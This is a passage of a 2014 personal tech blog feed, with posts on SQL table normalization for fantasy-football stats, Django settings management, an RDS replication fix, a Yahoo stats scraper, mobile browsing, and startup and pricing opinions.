  <span class="k">from</span> <span class="n">orig_stats</span> <span class="k">order</span> <span class="k">by</span> <span class="n">pos</span><span class="p">;</span></code></pre></figure>

<p>To generate the players table, we get the player position and team from the stats table and then find the associated ids from the teams and positions tables. The key assumption here is that there are no two players with the same name, on the same team, and the same position.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">players</span>
  <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">position_id</span><span class="p">,</span> <span class="n">team_id</span><span class="p">)</span>
  <span class="k">select</span> <span class="n">p</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">pos</span><span class="p">.</span><span class="n">id</span><span class="p">,</span> <span class="n">t</span><span class="p">.</span><span class="n">id</span>
  <span class="k">from</span> <span class="p">(</span>
    <span class="k">select</span> <span class="n">name</span><span class="p">,</span> <span class="k">position</span><span class="p">,</span>
      <span class="n">substring_index</span><span class="p">(</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">pos</span><span class="p">,</span>
      <span class="n">substring_index</span><span class="p">(</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">team</span>
    <span class="k">from</span> <span class="n">orig_stats</span>
    <span class="k">group</span> <span class="k">by</span> <span class="n">name</span><span class="p">,</span> <span class="k">position</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">team</span>
  <span class="p">)</span> <span class="n">p</span>
  <span class="k">join</span> <span class="n">teams</span> <span class="n">t</span> <span class="k">on</span> <span class="n">t</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">team</span>
  <span class="k">join</span> <span class="n">positions</span> <span class="n">pos</span> <span class="k">on</span> <span class="n">pos</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">pos</span><span class="p">;</span></code></pre></figure>

<p>We can figure out the schedule by getting a list of the unique matchups in the original stats table. Since the games are symmetric we only need to look at the rows that are home games.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">schedule</span>
  <span class="p">(</span><span class="n">week</span><span class="p">,</span> <span class="n">home_id</span><span class="p">,</span> <span class="n">away_id</span><span class="p">)</span>
  <span class="k">select</span> <span class="n">s</span><span class="p">.</span><span class="n">week</span><span class="p">,</span> <span class="n">t1</span><span class="p">.</span><span class="n">id</span><span class="p">,</span> <span class="n">t2</span><span class="p">.</span><span class="n">id</span>
  <span class="k">from</span> <span class="p">(</span>
    <span class="k">select</span> <span class="n">week</span><span class="p">,</span>
      <span class="n">substring_index</span><span class="p">(</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">home_team</span><span class="p">,</span>
      <span class="n">substring_index</span><span class="p">(</span><span class="n">opp</span><span class="p">,</span> <span class="s1">' vs '</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">away_team</span>
    <span class="k">from</span> <span class="n">orig_stats</span> <span class="n">s</span>
    <span class="k">where</span> <span class="n">opp</span> <span class="k">like</span> <span class="s1">'%vs%'</span>
    <span class="k">group</span> <span class="k">by</span> <span class="n">week</span><span class="p">,</span> <span class="n">home_team</span><span class="p">,</span> <span class="n">away_team</span>
  <span class="p">)</span> <span class="n">s</span>
  <span class="k">join</span> <span class="n">teams</span> <span class="n">t1</span> <span class="k">on</span> <span class="n">t1</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">home_team</span>
  <span class="k">join</span> <span class="n">teams</span> <span class="n">t2</span> <span class="k">on</span> <span class="n">t2</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">away_team</span>
  <span class="k">order</span> <span class="k">by</span> <span class="n">s</span><span class="p">.</span><span class="n">week</span><span class="p">,</span> <span class="n">t1</span><span class="p">.</span><span class="n">id</span><span class="p">,</span> <span class="n">t2</span><span class="p">.</span><span class="n">id</span><span class="p">;</span></code></pre></figure>

<p>Putting everything together we generate the new stats table by doing the relevant lookups in the tables we created. We can ignore the redundant fields (name, position, opponent) and the only thing we need to watch out for is duplicate players. In this case there are two names, Zach Miller and Alex Smith, that need to be made “unique” by also looking at their team.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">stats</span>
  <span class="p">(</span><span class="n">week</span><span class="p">,</span> <span class="n">player_id</span><span class="p">,</span>
  <span class="n">passing_yds</span><span class="p">,</span> <span class="n">passing_tds</span><span class="p">,</span> <span class="n">passing_int</span><span class="p">,</span> <span class="n">rushing_att</span><span class="p">,</span> <span class="n">rushing_yds</span><span class="p">,</span> <span class="n">rushing_tds</span><span class="p">,</span>
  <span class="n">receiving_tgt</span><span class="p">,</span> <span class="n">receiving_rec</span><span class="p">,</span> <span class="n">receiving_yds</span><span class="p">,</span> <span class="n">receiving_tds</span><span class="p">,</span> <span class="n">return_tds</span><span class="p">,</span>
  <span class="n">twopt</span><span class="p">,</span> <span class="n">fumbles</span><span class="p">,</span> <span class="n">points</span><span class="p">)</span>
  <span class="k">select</span> <span class="n">s</span><span class="p">.</span><span class="n">week</span><span class="p">,</span> <span class="n">p</span><span class="p">.</span><span class="n">id</span><span class="p">,</span>
  <span class="n">passing_yds</span><span class="p">,</span> <span class="n">passing_tds</span><span class="p">,</span> <span class="n">passing_int</span><span class="p">,</span> <span class="n">rushing_att</span><span class="p">,</span> <span class="n">rushing_yds</span><span class="p">,</span> <span class="n">rushing_tds</span><span class="p">,</span>
  <span class="n">receiving_tgt</span><span class="p">,</span> <span class="n">receiving_rec</span><span class="p">,</span> <span class="n">receiving_yds</span><span class="p">,</span> <span class="n">receiving_tds</span><span class="p">,</span> <span class="n">return_tds</span><span class="p">,</span>
  <span class="n">twopt</span><span class="p">,</span> <span class="n">fumbles</span><span class="p">,</span> <span class="n">points</span>
  <span class="k">from</span> <span class="n">orig_stats</span> <span class="n">s</span>
  <span class="k">join</span> <span class="n">teams</span> <span class="n">t</span> <span class="k">on</span> <span class="n">substring_index</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">name</span>
  <span class="k">join</span> <span class="n">players</span> <span class="n">p</span> <span class="k">on</span> <span class="n">s</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">name</span> <span class="k">and</span> <span class="n">p</span><span class="p">.</span><span class="n">team_id</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">id</span><span class="p">;</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mobile web browsing and Javelin</title>
   <link href="http://dangoldin.com/2014/09/27/mobile-web-browsing-and-javelin/"/>
   <updated>2014-09-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/27/mobile-web-browsing-and-javelin</id>
   <content:encoded><![CDATA[
<p>Something that’s bothered me ever since I started using a smartphone is the link opening behavior. Whenever I’m in an app and click on a web link it would immediately open up that page in a browser window. And when I’m already in a mobile browser and click on a link it would open that page up in a new tab. Compare this with the desktop environment. Clicking on a link within an app does open up a new browser window immediately but since there are shortcuts to quickly switch between programs it’s not a huge deal. And when I’m already looking at a webpage and want to open a new link it’s possible to open it in the background using command+click.</p>

<p>The most common reason I click on a link is as a bookmark so that I can go through it after I’m done with what I’m currently doing. The default behavior is the opposite of that - it turns something that I want to consume asynchronously into a synchronous process. Sure there are times where I do want to switch gears but the vast majority of the time opening a new window is a distraction. That’s why it’s so surprising that mobile web browsers have adopted this behavior. Smartphones are both slower than desktops and make it more difficult to switch between programs. Why couldn’t the default behavior be to open all new links in the background?</p>

<p>I finally found a browser that lets me do just that. It’s called <a href="http://javelinbrowser.com/" target="_blank">Javelin</a> and has a feature called “Stacks” that lets you click links while allowing you to continue using the phone. These links are loaded in the background and are ready to be consumed whenever you want to go through them by clicking on a little overlaid icon. This is quickly becoming one of my favorite new apps since switching to Android and I’m hopeful we’ll see other desktop behaviors translated into a mobile-friendly versions. I think this is where Android has an edge by providing a more open environment for developers to work with. With that openness you do end up with more crap but also more gold.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dev tools matter</title>
   <link href="http://dangoldin.com/2014/09/25/dev-tools-matter/"/>
   <updated>2014-09-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/25/dev-tools-matter</id>
   <content:encoded><![CDATA[
<p>It’s amazing the impact tools have on productivity and enjoyment. I remember my first foray into Java using a combination of text editors and Ant. Setting up and configuring a simple project was a nightmare and without the internet I don’t know how I would have figured it out. This initial experience made me associate Java with an unnecessarily complicated approach that I wanted to avoid.</p>

<p>After Java, Python felt like a breath of fresh air. The code was simpler, more compact, and I was able to just dive in. Discovering pip and virtualenv made me enjoy it even more. But no language is perfect and with enough you uncover the imperfections. Performance became a bottleneck when I started working on serious code and I missed the benefits of static typing - especially when refactoring a large projects.</p>

<p>Recently, I started using Java again and it’s a completely different experience. I’m not sure whether it’s due to hardware or software improvements but Eclipse feels faster and more responsive. It makes Java nearly as fun as Python. The static, strong typing makes it easy to do large scale refactorings, Gradle and the open source ecosystem make it trivial to leverage all sorts of libraries, and the performance/coding ease is great - especially when dealing with concurrency. Good tools can make a world of difference to the accessibility and joy of writing a language. I read a while ago that Facebook has the strongest people <a href="http://algeri-wong.com/yishan/engineering-management-tools-are-top-priority.html" target="_blank">working on internal tools</a> and I’m not surprised; it may be one of the most effective way to make everyone happier and more productive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Software is good enough, why improve the hardware?</title>
   <link href="http://dangoldin.com/2014/09/21/software-is-good-enough-why-improve-the-hardware/"/>
   <updated>2014-09-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/21/software-is-good-enough-why-improve-the-hardware</id>
   <content:encoded><![CDATA[
<amp-youtube data-videoid="0lvMgMrNDlg" layout="responsive" width="640" height="480"></amp-youtube>

<p>Earlier this morning I watched a Steve Jobs talk from 1980 where he discusses Apple and the relationship between hardware and software. An interesting piece comes at the 12:30 mark where he addresses the question “Right now software is powerful enough, what impact will improvements in hardware have on software?” His answer is great: “[We will] start chewing up power specifically to help that one on one interaction go smoothly and specifically not to help the calculation…  start applying that power to remove that barrier”</p>

<p>Sure the response is very Jobsian but the underlying point is significant. It’s only a tiny bit about what the software actually does; the majority is realizing that people will actually be using the software to solve problems and building tools for that experience. I remember starting with DOS on the family computer and being blown away when I first used Norton Commander. Similarly to when I saw Windows for the first time and saw my first smartphone.</p>

<p>Most hardware improvements over the past 30 years led to improvements in usability, not functionality. Processors in 2014 are 100,000 times more powerful than those in the early 1980s and a majority of the improvement went into user experience - better UIs packed into smaller devices. Without usability improvements computers wouldn’t be nearly as ubiquitous as they are now and would primarily stay a hobby for engineers. Each usability improvement brings aboard a whole new set of people. You can make the case that the same thing occurs with programming languages - very few people were writing assembly code at its peak compared to C code, and fewer people were writing C code at its peak than JavaScript.</p>

<p>Usability improvements are still happening but they’re taking the form of cloud and background services - akin to the way Google Now provides contextual information and the way Siri handles voice recognition. As sophisticated as they are, they will only get better as hardware improves.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Dealing with an RDS replication issue</title>
   <link href="http://dangoldin.com/2014/09/20/dealing-with-an-rds-replication-issue/"/>
   <updated>2014-09-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/20/dealing-with-an-rds-replication-issue</id>
   <content:encoded><![CDATA[
<p>Earlier this week we encountered an odd RDS issue that I’ve never seen before. An AWS hiccup caused a database replication query to fail which stopped the replication process. We discovered this the following day when we saw weird results during after running an analysis query. The nice thing was that this wasn’t a huge deal since our production system relies on the master database but we did have to spend time dealing with this.</p>

<p>When we discovered this issue we did a few online searches to see how to resolve the issue and resume the replication. Turns out there’s a command, “CALL mysql.rds_skip_repl_error”, that will skip the current replication error and move on. In our case, the errors occurred when creating temporary table for a legacy job so we were able to skip it. Otherwise, we’d run the risk of breaking the sync between our master and replica databases.</p>

<p>Unfortunately, running this query once wasn’t enough since the error keep on reappearing. After speaking with an AWS rep, we realized we could keep on running that command until we skipped past the replication errors. Another useful tip was to look at the ReplicaLag CloudWatch metric to see how far behind the replica database was from the master. In our case after going through a couple of dozen of these skip error calls replication resumed but the replica database was still more than a day behind.</p>

<p>While the replication caught up, we made a quick update to our scripts to point to our master database instead of replica so that our jobs would reference the correct data. After replication caught up we simply reverted this change.</p>

<p>To prevent this issue in the future, we’re going to revisit the jobs that were using the temporary tables. We’ve also added a CloudWatch alert to notify us if replica gets too far behind. In a way we got lucky since these errors were recoverable. Without that we would have had to recreate the replica database which may have had a performance impact on our master database.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Web development bootcamps</title>
   <link href="http://dangoldin.com/2014/09/17/web-development-bootcamps/"/>
   <updated>2014-09-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/17/web-development-bootcamps</id>
   <content:encoded><![CDATA[
<p>I recently attended two web development workshop “meet and greet” sessions where recent graduates presented their projects and chatted with potential employers. I’m honestly surprised by how polished the projects were. Sure there were a few simple ones but most were solid; they were good ideas, well designed, and had functional backends. It’s amazing what it’s possible to do in 12 weeks.</p>

<p>These programs focus on a single frontend framework, such as Backbone or Angular, and a backend framework, usually Ruby on Rails. With the number of plugins and public APIs available it’s easier to get an app up and running than ever before. Of course these programs won’t provide the same level of knowledge as a degree or years of experience will but for many projects that’s not important. Being able to get something functional and private is more important than perfect and private and these bootcamps provide enough skills to do that. More importantly, they make code accessible to an entirely new group of people and provide enough skills to allow them to continue learning on their own.</p>

<p>It does make you think where tech skills are headed. As it becomes easier to build a larger variety of apps it will be interesting to see where software engineering will end up. Software engineering is a young industry and I suspect it’ll become increasingly specialized as the base set of tools and knowledge become widespread.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Top down vs bottom up coding</title>
   <link href="http://dangoldin.com/2014/09/16/top-down-vs-bottom-up-coding/"/>
   <updated>2014-09-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/16/top-down-vs-bottom-up-coding</id>
   <content:encoded><![CDATA[
<p>Over the years, I’ve noticed two distinct coding styles. Some approach problems top down and will stub out the entire solution using dummy values and methods and come up with a naive solution before fleshing everything out properly. Others will instead take a bottom up approach and try to complete each method entirely before moving on to the next one.</p>

<p>Especially for larger problems, I prefer the top down approach. By stubbing out the various pieces it’s easy to see how everything fits together and makes it easy to identify and solve potential issues before investing a ton of effort into a poor implementation. The other benefit is that I start thinking at a systems level and come up with implementations that tend to be more extensible.</p>

<p>The only time I find myself taking a bottom up approach is when the problem is very well defined and I know exactly what the solution is or when I’m working on HTML and CSS. In that case, and especially with my limited skill, there’s so much coupling between the various components that I can’t avoid going linearly through the components. It does make me wonder whether people who have more frontend experience have also adopted the top down approach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Curated Twitter timelines and the tech stack</title>
   <link href="http://dangoldin.com/2014/09/08/curated-twitter-timelines-and-the-tech-stack/"/>
   <updated>2014-09-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/08/curated-twitter-timelines-and-the-tech-stack</id>
   <content:encoded><![CDATA[
<p>Apparently Twitter is considering curation user’s timelines. A perspective people haven’t really discussed is the impact on the tech side. Right now each user has a unique timeline that needs to be presented in near-real time in case they need to see it. This results in a massive storage operation using Redis where these timelines are <a href="http://highscalability.com/blog/2014/9/8/how-twitter-uses-redis-to-scale-105tb-ram-39mm-qps-10000-ins.html" target="_blank">continuously generated and cached</a>. By moving to a model where every user can be categorized into a group that sees a particular set of tweets Twitter can drastically reduce the amount of data they need to store per user. I’m sure Twitter already has a way of categorizing users in order to support the ad product and this approach would extend it to the “stream” product. In a way it’s akin to how compression works - find repeated patterns and replace every occurrence with something shorter. Then when you want to uncompress you just reverse the process.</p>

<p>I doubt this is the primary driver of the curation discussion and there are clearly more important issues at stake but this may be the proverbial “cherry on top” that will get Twitter to move to the curated model.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Importance of various tech services</title>
   <link href="http://dangoldin.com/2014/09/07/importance-of-various-tech-services/"/>
   <updated>2014-09-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/07/importance-of-various-tech-services</id>
   <content:encoded><![CDATA[
<p>A <a href="http://techcrunch.com/2014/09/05/monetization-automation-enforcement/" target="_blank">recent article</a> on our attachment to social media got me thinking about my most commonly used services and their relative importance. The goal is to answer the question of how I’d feel if various services suddenly disappeared. After going through this process it feels as if these services moved from being necessities to feeling like luxuries. They either have a substitute that will do what they do or only have value due to the network - clearly these are important but I just have no attachment to the product itself.</p>

<ul>
  <li>
    <p>Facebook: I don’t care much for it and at a certain level I want it to disappear. The best reason I use it is the only reason I use it - everyone I know is on it.</p>
  </li>
  <li>
    <p>Twitter: I enjoy Twitter and use it more frequently than Facebook but don’t think I’d feel the loss terribly. I use it as a content source primarily and in the end the stuff I’m interested in can most likely be found via Hacker News.</p>
  </li>
  <li>
    <p>Hacker News: Years ago, I remember participating in the discussions but lately I’ve just been using it as a source of news. My current use case would be taken care of via Reddit or any other tech news aggregator.</p>
  </li>
  <li>
    <p>Foursquare: This would be the biggest loss but purely from nostalgia. I started using it when it launched and saw it evolve through the various products. I’m not a fan of the recent split into Swarm and Foursqare but still suspect I’d be most upset if Foursquare disappeared.</p>
  </li>
</ul>

<p>It’s sad that I feel so cynical about the apps and I’m trying to understand why. I suspect part of it is that the novelty of these has worn off and part is that there’s so many new tech products out there that it may just be overload. We’ll see how I feel about them after the next five years.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>API first startups</title>
   <link href="http://dangoldin.com/2014/09/01/api-first-startups/"/>
   <updated>2014-09-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/09/01/api-first-startups</id>
   <content:encoded><![CDATA[
<p>When building a SAAS product geared towards developers the quickest way to start is to build an API. One can even make the argument that the MVP should just be the API documentation. This benefits both sides. Potential users of the API will know exactly what to expect and have a clear understanding of the functionality and limitations and you can quickly see if there are any issues or inconsistencies in what you’re building. Some non-fiction authors will share a table of contents with potential readers in order to get feedback and this extends that idea to companies and their products. Especially when your primary users are developers this is a simple way to share your idea and approach without resorting to buzzwords or even relying on a beautiful site design.</p>

<p>The best example of this approach is <a href="https://stripe.com/" target="_blank">Stripe</a>. At launch, they had a beautiful API that you were able to use without creating an account. After seeing how it well it worked it was an easy decision to register for a full account. Tons of companies adopt an API-first approach for their internal systems and it’s not a lot of work to extend this to the external world. There’s definitely a risk in doing it since you’re exposing more of your internals but if you claim to be developer friendly it’s the best way to actually prove it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Managing settings files in Django projects</title>
   <link href="http://dangoldin.com/2014/08/30/managing-settings-files-in-django-projects/"/>
   <updated>2014-08-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/30/managing-settings-files-in-django-projects</id>
   <content:encoded><![CDATA[
<p>I was helping a friend deploy a Django project over the weekend and we chatted about the best way to manage multiple settings files in a Django project. The primary reason is that you will typically have different settings between a production and development environment and but at the same time will have a lot of options shared between them. A production environment will typically be more restrictive and optimized for performance whereas a development environment will be setup to provide as much debug information as possible.</p>

<p>This got me thinking of the various configurations I’ve gone through over the years and what my latest approach has been. If you have additional variations and suggestions that you’ve been happy with I’d love to hear them.</p>

<ul>
<li>My first real project had a single settings.py file that defined a different set of options based on the hostname. The benefit here was that every configuration setting was in one file and it was pretty easy to see what the differences were between development and production. The problem is that if the hostname ever changes you may break your entire application. This also makes it difficult to share you code with a team since the hostnames will be different and you end up with a massive file full of different configuration settings.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>

<span class="k">if</span> <span class="n">socket</span><span class="p">.</span><span class="n">gethostname</span><span class="p">()</span> <span class="o">==</span> <span class="s">'ubuntu'</span><span class="p">:</span>
    <span class="n">CONFIG_OPTION</span> <span class="o">=</span> <span class="s">'prod-setting'</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">CONFIG_OPTION</span> <span class="o">=</span> <span class="s">'dev-setting'</span></code></pre></figure>

</li>

<li>A simple improvement was splitting this single file into a common settings file along with separate files for each environment that were then imported based on the hostname. The common settings file would contain the shared settings while the individual environment files would contain the settings unique to each environment. This kept the files cleaner and made it clear what setting applied to which environment.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>

<span class="k">if</span> <span class="n">socket</span><span class="p">.</span><span class="n">gethostname</span><span class="p">()</span> <span class="o">==</span> <span class="s">'ubuntu'</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">settings_prod</span> <span class="kn">import</span> <span class="o">*</span>
<span class="k">else</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">settings_dev</span> <span class="kn">import</span> <span class="o">*</span></code></pre></figure>

</li>

<li>The previous options still suffered from relying on the hostname so a simple improvement was using symbolic links to point to the appropriate file. With this approach we can still have a common file as well as the individual files but the environment-specific files are importing the shared settings. The big advantage to this approach is that the the symbolic link command only needs to be run once on each server and will always point to the correct file.

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># settings_prod.py
</span>
<span class="kn">from</span> <span class="nn">settings_common</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Now set the prod only options
</span><span class="n">CONFIG_OPTION</span> <span class="o">=</span> <span class="s">'prod-setting'</span></code></pre></figure>



<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">ln</span> <span class="nt">-s</span> settings_prod.py settings.py</code></pre></figure>

</li>

<li>Another option that I started using is using the DJANGO_SETTINGS_MODULE environment variable to point to the appropriate settings file. I adopted this approach after reading <a href="http://twoscoopspress.org/collections/everything/products/two-scoops-of-django-1-6" target="_blank">Two Scoops of Django</a> which has a ton of other useful tips that improved my development approach. This approach isn’t significantly different than the symbolic link one but it feels less hacky since it’s an approach supported by the official Django documentation and it’s easier to examine environment variables than looking at the symbolic links across your directory.

<figure class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nb">export </span>DJANGO_SETTINGS_MODULE <span class="o">=</span> project.settings.prod</code></pre></figure>

</li>

</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yahoo fantasy football stats - 2014 edition</title>
   <link href="http://dangoldin.com/2014/08/26/yahoo-fantasy-football-stats-2014-edition/"/>
   <updated>2014-08-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/26/yahoo-fantasy-football-stats-2014-edition</id>
   <content:encoded><![CDATA[
<p>This might be too late for some but I dug up my Yahoo fantasy football stats scraper from last year and <a href="https://github.com/dangoldin/yahoo-ffl" target="_blank">updated it to work</a> for the 2014 season. The old version used the great <a href="http://scrapy.org/" target="_blank">Scrapy</a> framework but unfortunately Yahoo changed something on their end that made the login spoofing too difficult to do via a backend script. The new approach uses <a href="http://www.seleniumhq.org/" target="_blank">Selenium</a> to open up a Chrome web browser, login to Yahoo, and then iterate through each page of stats and downloads the data into a CSV file.</p>

<p>Note that the code was designed around my league’s settings and that the column order in Yahoo will depend on the scoring categories of your league. If that’s the case you need to make sure to update the code (primarily the xpath expressions) to map to the columns in your view. Definitely feel free to submit a pull request that makes the code a bit more flexible since my goal was to get something out quick in time for a draft later this week.</p>

<p>And if all you care about is the data, here’s the <a href="https://raw.githubusercontent.com/dangoldin/yahoo-ffl/master/stats-2014.csv" target="_blank">projected 2014 data</a> as of August 25, 2014.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cofounders and their situations</title>
   <link href="http://dangoldin.com/2014/08/22/cofounders-and-their-situations/"/>
   <updated>2014-08-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/22/cofounders-and-their-situations</id>
   <content:encoded><![CDATA[
<p>Countless people have written about cofounder conflicts in a startup but I rarely see anyone talk about how important a similar situation is - financial and personal. There are no problems when things are going well and it’s only when things start going poorly, which they inevitably will, that these issues surface.</p>

<p>A founder that doesn’t have a lot of savings will have a different relationship to fundraising than the founder who has enough savings to keep going. The former will push to fundraise early while the latter will want to wait and search for the best opportunity.</p>

<p>A founder that’s single will have a different lifestyle and priorities than someone who is married or in a serious relationship. The founders will have a different approach to work and may have a hard time agreeing on a culture that fits them as well as the rest of the team.</p>

<p>A founder that wants to start a company is different than a founder who wants to strike it rich is different from a founder who believes in changing the world. Each of them are valid perspectives but put them in a room together and it will be impossible to make even the simplest decisions.</p>

<p>At <a href="http://getpressi.com" target="_blank">Pressi</a>, we had our fair share of founder conflicts and in hindsight a big part of it was how different our situations were - it’s definitely beneficial to have a team come from diverse background and provide multiple perspectives but it’s also critical that everyone understands where everyone else is coming from. And it’s important to do this when things are going well, otherwise they will become bigger issues when things are going poorly and every emotion and event is magnified.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Trick your users into staying</title>
   <link href="http://dangoldin.com/2014/08/18/trick-your-users-into-staying/"/>
   <updated>2014-08-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/18/trick-your-users-into-staying</id>
   <content:encoded><![CDATA[
<p>It’s just too easy to rant against LinkedIn but I can’t help it. They recently offered me a free month of business plus so I took them up on it. Little did I know (although I should have expected it) that canceling would be a maze that I still may not have escaped.</p>

<img src="http://dangoldin.com/assets/static/images/linkedin-downgrade.png" alt="LinkedIn Downgrade" width="983" height="282" layout="responsive"/>

<p>The cancel screen hides the downgrade to free option and automatically chooses a paid “recommended account” with a bright clickable “Downgrade Account” button. And then, when you actually do manage to downgrade, it’s not clear from the account settings page that you downgraded since it still displays as the premium account option. Maybe when my free month is up it will downgrade or maybe I’ll get charged - how am I supposed to know? I do see a note that says canceled and I suspect I’m in the clear but there’s no way to actually confirm other than contacting support.</p>

<img src="http://dangoldin.com/assets/static/images/linkedin-settings.png" alt="LinkedIn Settings Page" width="445" height="130" layout="responsive"/>

<p>It’s one thing to optimize your funnels to get more conversions and revenue is one thing but tricking your users to subscribe is entirely different. If your product relies on this sort of “optimization” you really should think of another business model.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A MySQL class proposal</title>
   <link href="http://dangoldin.com/2014/08/17/a-mysql-class-proposal/"/>
   <updated>2014-08-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/17/a-mysql-class-proposal</id>
   <content:encoded><![CDATA[
<p>I’m clearly biased but I believe technology is critically important and we should be spending more effort teaching it than we are now. To that end, I’ve been volunteering with <a href="http://www.tealsk12.org/" target="_blank">TEALS</a>, a national program that allows professionals to teach Computer Science classes in a local high school. Something else I’ve been working on is developing a MySQL class to give as part of the <a href="http://www.c4q.nyc/" target="_blank">Coalition 4 Queens</a> program. As part of the process I wanted to share what I’m thinking of doing and would love to get some feedback to hopefully improve it. The general idea is that it will consist of 3 or 4 sessions with each session lasting a couple of hours. The class will be opt-in and the students should have some technology background.</p>

<p>Session I</p>

<ul>
  <li>Overview of MySQL and relational databases. What are they? How are they used? What are the alternatives?</li>
  <li>Provide a quick overview of the normal forms and what they mean. What impact does it have when they’re violated and go over what well designed databases have.</li>
  <li>Introduce the dataset we will be working with. This will mostly likely be a dataset I’ll pull from some of my side projects that will hopefully be relevant. Currently, I’m thinking of using a database containing some fantasy football data that I’ve scraped.</li>
  <li>Make sure everyone has MySQL installed or can get it installed.</li>
</ul>

<p>Session II</p>

<ul>
  <li>Revist the dataset we’re working with and explain the relationships between the various tables and columns.</li>
  <li>Go over the basic syntax of a query: SELECT, FROM, and WHERE.</li>
  <li>Go over the basic INSERT statement.</li>
</ul>

<p>Session III</p>

<ul>
  <li>Review the basic syntax of a query and introduce the JOIN operations. Use joins to answer some simple questions from our dataset.</li>
  <li>Introduce the GROUP BY functionality and the ways it can be used to summarize data. Use this in conjunction with joins to explore our dataset.</li>
  <li>Develop some complicated and slow queries and introduce the idea of INDICES so everyone is aware of why they are useful.</li>
</ul>

<p>Session IV</p>

<ul>
  <li>Go over table creation and have the students come up with some interesting aggregate tables.</li>
  <li>Provide a quick overview of how to diagnose a query for performance and how to test a query to make sure it was written correctly.</li>
  <li>Discuss the various system tables (information_schema schema) and the various system commands that can be used to get a better understanding of MySQL</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Books are insanely cheap</title>
   <link href="http://dangoldin.com/2014/08/11/books-are-insanely-cheap/"/>
   <updated>2014-08-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/08/11/books-are-insanely-cheap</id>
   <content:encoded><![CDATA[
<p>While the pricing battle between Amazon and Hachette rages on, I’ve been thinking about the relationship between price and value. A typical ebook on Amazon costs $9.99 while a movie in a theater, especially one in New York, can cost more than $10. And yet the book takes longer to experience - a movie is over within 2 hours while a book can be enjoyed for hours. Or how about a beer or coffee, they’re two to three times cheaper than an ebook but are consumed an order of magnitude faster book and only provide immediate gratification.</p>

<p>Amazon released data indicating that dropping the price of an ebook from $14.99 to $9.99 (33%) leads to a 74% increase in number of books sold. I understand that a lower price increases demand but it’s still ridiculous that we’re that concerned about a $5 price difference for a book when we’re spending that much on a coffee.</p>

